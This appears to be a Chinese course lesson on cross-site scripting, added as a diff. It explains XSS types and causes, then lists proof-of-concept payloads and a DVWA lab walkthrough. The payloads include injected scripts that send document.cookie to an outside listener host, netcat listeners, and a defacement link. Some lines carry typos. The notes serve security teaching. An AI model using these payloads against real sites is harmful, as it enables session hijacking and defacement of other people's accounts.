@@ -1,0 +1,97 @@
+课时97 XSS-简介、跨站脚本检测和常见的攻击利用手段
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃XSS                                                                   ┃
+┃攻击WEB客户端                                                         ┃
+┃客户端脚本语言                                                        ┃
+┃    弹窗警告、广告                                                    ┃
+┃    Javascript                                                        ┃
+┃    在浏览器中执行                                                    ┃
+┃XSS(cross-site scripting)                                             ┃
+┃    通过WEB站点漏洞，向客户端交付恶意脚本代码，实现对客户端的攻击目的 ┃
+┃    注入客户端脚本代码                                                ┃
+┃    盗取cookie                                                        ┃
+┃    重定向                                                            ┃
+┃VBScript,ActiveX,or Flash                                             ┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃XSS                                               ┃
+┃JavaScript                                        ┃
+┃    与Java语言无关                                ┃
+┃    命令完全出于市场原因                          ┃
+┃    使用最广的客户端脚本语言                      ┃
+┃使用场景                                          ┃
+┃    直接嵌入html:<script>aler('XSS');</script>    ┃
+┃    元素标签事件: <body onload=alert('XSS')>      ┃
+┃    图片标签: <img src="javascript:alert('XSS');">┃
+┃    其他标签: <iframe>,<dir>,and<link>            ┃
+┃    DOM对象，篡改页面内容                         ┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━━╋
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃XSS                                             ┃
+┃攻击参与方                                      ┃
+┃    攻击者                                      ┃
+┃    被攻击者                                    ┃
+┃    漏洞站点                                    ┃
+┃    第三方站点（攻击目标、攻击参与站）          ┃
+┃漏洞形成的根源                                  ┃
+┃    服务器对用户提交数据过滤不严                ┃
+┃    提交给服务器的脚本被直接返回给其他客户端执行┃
+┃    脚本在客户端执行恶意操作                    ┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━╋
+
+╋━━━━━━━━━━╋
+┃XSS                 ┃
+┃XSS漏洞类型         ┃
+┃    存储型（持久型）┃
+┃    反射型（非持久）┃
+┃    DOM型           ┃
+╋━━━━━━━━━━╋
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃XSS                                                                         ┃
+┃漏洞PoC                                                                     ┃
+┃    <script>alert('xss')</script>                                           ┃
+┃    <a href=" onclick=alert('xss')>type</a>                                 ┃
+┃    <img src=http://1.1.1.1/a.jpg onerror=alert('xss')>                     ┃
+┃    <script>window.location='http://1.1.1.1'</script>                       ┃
+┃    <iframe SRC="http://1.1.1.1/victim" height="0" width="0"></iframe>      ┃
+┃    <script>new                                                             ┃
+┃    Image().src="http://1.1.1.1/c.php?output="+document.cookie;</script>    ┃
+┃    <scipt>document.body.innerHTML="<div style=visibility:visible;><hl>THIS ┃
+┃    WEBSITE IS UNDER ATTACK</hl></div>";</scirpt>                           ┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+
+root@R:~# nc -vnlp 80
+
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+┃XSS                                                                 ┃
+┃窃取cookie                                                          ┃
+┃<script src=http://1.1.1.1/a.js></script>                           ┃
+┃a.js源码                                                            ┃
+┃    var img = new Image();                                          ┃
+┃    img.src = "http://1.1.1.1/cookies.php?cookie="+doucument.cookie;┃
+╋━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╋
+
+root@R:~# vi 1.html
+<html>
+<head>
+<title>my title</title>
+</head>
+<body>
+<a href="http://192.168.1.107/dvwa/vulnerabilites/xss_r/
+?name=<script>document.body.innerHTML="<div sytle=visibility:visible;><hl>THIS WEBSITE IS UNDER ATTACK</hl></div>";</script>click</a>
+</body>
+</html>
+
+root@R:~# cd /var/www/html
+
+root@R:/var/www/html# nc -vnlp 88
+
+root@R:/var/www/html# vi a.js
+var img = new Image()
+img.src = "http://192.168.1.102:88/cookie.php?cookie="+document.cookie;
+
+
